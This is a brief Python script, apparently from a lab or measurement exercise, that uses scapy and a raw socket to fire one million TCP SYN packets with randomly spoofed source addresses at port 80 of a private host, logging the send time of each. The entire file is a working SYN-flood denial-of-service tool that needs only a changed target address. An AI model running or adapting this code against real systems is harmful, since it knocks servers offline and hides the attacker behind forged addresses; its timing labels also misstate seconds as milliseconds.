#! /usr/bin/python
from scapy.all import *
from socket import *
import time
count=0;
sum=0;
f = open("syns_results_p.txt", "a")
s_o=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)

for i in range (100):
	for j in range (10000):
    	
		count+=1
		a=IP()
		a.src=src_IP = RandIP()._fix()
		a.sport=src_port = RandShort()._fix()
		a.dst= '10.0.2.4'
		b=TCP()
		b.dport=80
		b.flags="S"
		p=a/b
		start = time.time()
		#send(p)
		s_o.sendto(bytes(p),('10.0.2.4',80))
		end = time.time()
		print("send num"+str(count))
		f.write(str(count)+","+str(end-start)+"\n")
		sum+=(end-start)

f.write("\n AVG time  in ms is: "+str(sum/count))
f.write("\n All time  in ms is: "+str(sum))
f.close()



